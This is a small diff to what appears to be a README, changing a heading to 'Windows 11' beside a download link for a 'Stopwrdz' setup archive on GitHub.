@@ -1,5 +1,5 @@
 
-# **Windows**
+# **Windows 11**
 ## Download SetUp: [Stopwrdz](https://github.com/TrustViking/stopwrdz_setup/archive/main.zip)
 
 
